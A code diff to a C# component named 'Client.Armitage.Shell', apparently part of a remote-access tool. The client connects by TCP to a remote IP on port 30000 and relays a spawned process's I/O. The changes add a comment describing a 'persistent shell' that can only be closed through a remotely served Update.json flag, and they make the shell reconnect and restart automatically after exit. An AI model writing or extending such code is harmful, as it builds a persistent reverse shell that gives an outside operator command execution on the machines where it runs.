@@ -24,7 +24,7 @@ namespace Client.Armitage.Shell
 
         private static ushort Port = 30000;
 
-        private static Thread _reader;
+        private static Thread _reader = null;
 
         private static TcpClient _client;
 
@@ -40,10 +40,15 @@ namespace Client.Armitage.Shell
             // start reading from remote endpoint
             IPAddress ip = IPAddress.Parse(ApiIP);
 
-            _reader = new Thread(ContinuousReading);
+            if (_reader == null)
+            {
+                _reader = new Thread(ContinuousReading);
 
-            _reader.Start();
+                _reader.Start();
+            }
         }
+
+        // opens a persisten shell that can only be closed when setting Update.json's OpenShell to false
         public static void ContinuousReading()
         {
             while (Utilities.Updater.Latest != null && Utilities.Updater.Latest.OpenShell)
@@ -162,6 +167,7 @@ namespace Client.Armitage.Shell
             p.StartInfo.RedirectStandardError = true;
 
             p.Exited += (po, o) => {
+
                 if (_stream != null)
                 {
                     var bytes = new byte[] { (byte)Message_Types.Exited };
@@ -169,7 +175,19 @@ namespace Client.Armitage.Shell
                     _stream.Write(bytes, 0, bytes.Length);
 
                     _stream.Flush();
+
+                    try
+                    {
+                        // wait for new connection
+                        _client.Close();
+
+                        _stream.Close();
+                    }
+                    catch { }
+
+                    Start();
                 }
+
             };
 
             p.Start();
